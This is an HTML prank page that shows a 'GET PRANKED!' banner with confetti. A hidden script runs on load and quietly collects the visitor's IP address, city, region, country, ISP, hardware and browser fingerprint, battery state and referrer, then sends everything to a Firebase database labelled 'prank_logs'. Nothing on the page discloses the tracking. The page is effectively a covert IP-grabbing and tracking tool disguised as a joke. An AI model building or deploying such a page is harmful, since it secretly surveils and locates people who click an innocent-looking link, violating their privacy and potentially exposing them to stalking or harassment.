<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GET PRANKED! 🎉</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background: linear-gradient(135deg, #121212, #1a1a2e);
            color: #fff;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            text-align: center;
        }
        .container {
            z-index: 10;
            padding: 20px;
        }
        h1 {
            font-size: 4rem;
            font-weight: 900;
            text-transform: uppercase;
            background: linear-gradient(45deg, #ff007f, #ffaa00, #00f0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: pulse 1.5s infinite alternate;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.5rem;
            color: #e0e0e0;
            font-weight: 300;
        }
        @keyframes pulse {
            from { transform: scale(1); }
            to { transform: scale(1.05); }
        }
        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
    <!-- Canvas Confetti Library -->
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
</head>
<body>

    <canvas id="confetti-canvas"></canvas>

    <div class="container">
        <h1>GET PRANKED! 🎉</h1>
        <p>Gotcha! Hope this brightened your day.</p>
    </div>

    <!-- Firebase SDK Modules via CDN -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, push, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
        import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAO_ffupJOIMPE9m4ARtaqSzC1vGDkIAco",
            authDomain: "nexus-web-development-official.firebaseapp.com",
            databaseURL: "https://nexus-web-development-official-default-rtdb.firebaseio.com",
            projectId: "nexus-web-development-official",
            storageBucket: "nexus-web-development-official.firebasestorage.app",
            messagingSenderId: "553556577139",
            appId: "1:553556577139:web:128af196a1eb3dd5999306",
            measurementId: "G-1JW4TQFEG2"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const analytics = getAnalytics(app);

        async function logDetailedVisitorData() {
            let ipAddress = "Unknown";
            let geoData = {};

            // 1. Fetch Network & Location Data
            try {
                const response = await fetch('https://ipapi.co/json/');
                if (response.ok) {
                    const data = await response.json();
                    ipAddress = data.ip || "Unknown";
                    geoData = {
                        city: data.city || "Unknown",
                        region: data.region || "Unknown",
                        country: data.country_name || "Unknown",
                        isp: data.org || "Unknown",
                        asn: data.asn || "Unknown"
                    };
                }
            } catch (error) {
                console.error("IP lookup failed:", error);
            }

            // 2. Fetch Optional Battery Data (Async API)
            let batteryInfo = "Not Supported";
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    batteryInfo = {
                        level: `${Math.round(battery.level * 100)}%`,
                        isCharging: battery.charging
                    };
                } catch(e) {}
            }

            // 3. Measure rough Page Load Speed performance metrics
            let loadTimeSec = "Unknown";
            if (window.performance && window.performance.timing) {
                const t = window.performance.timing;
                loadTimeSec = ((t.loadEventEnd - t.navigationStart) / 1000).toFixed(2) + "s";
                if (loadTimeSec.includes("-") || parseFloat(loadTimeSec) <= 0) loadTimeSec = "Fast (Cached)";
            }

            // 4. Construct Highly Labeled Object Categories
            const organizedPayload = {
                network_information: {
                    ip_address: ipAddress,
                    network_provider: geoData.isp || "Unknown",
                    autonomous_system: geoData.asn || "Unknown",
                    connection_type: navigator.connection ? navigator.connection.effectiveType : "Unknown"
                },
                geographical_location: {
                    city: geoData.city || "Unknown",
                    state_region: geoData.region || "Unknown",
                    country: geoData.country || "Unknown"
                },
                hardware_details: {
                    cpu_cores: navigator.hardwareConcurrency || "Unknown",
                    device_memory_gb: navigator.deviceMemory || "Unknown",
                    screen_resolution: `${window.screen.width}x${window.screen.height}`,
                    color_depth_bits: window.screen.colorDepth,
                    device_pixel_ratio: window.devicePixelRatio,
                    battery_status: batteryInfo
                },
                browser_environment: {
                    user_agent: navigator.userAgent,
                    browser_language: navigator.language,
                    cookies_enabled: navigator.cookieEnabled,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    online_status: navigator.onLine ? "Online" : "Offline"
                },
                session_metadata: {
                    traffic_source_referrer: document.referrer || "Direct Visit",
                    page_load_duration: loadTimeSec,
                    server_logged_time: serverTimestamp()
                }
            };

            // Write structured folders directly under 'prank_logs'
            const logsRef = ref(database, 'prank_logs');
            push(logsRef, organizedPayload)
                .then(() => console.log("Structured metrics updated successfully."))
                .catch((err) => console.error("Database sync failed:", err));
        }

        // Execute data logging instantly
        logDetailedVisitorData();
    </script>

    <!-- Continuous Confetti Engine -->
    <script>
        const myCanvas = document.getElementById('confetti-canvas');
        const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };

        function randomInRange(min, max) {
            return Math.random() * (max - min) + min;
        }

        setInterval(function() {
            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } });
            confetti({ ...defaults, particleCount: 35, origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } });
        }, 250);
    </script>
</body>
</html>
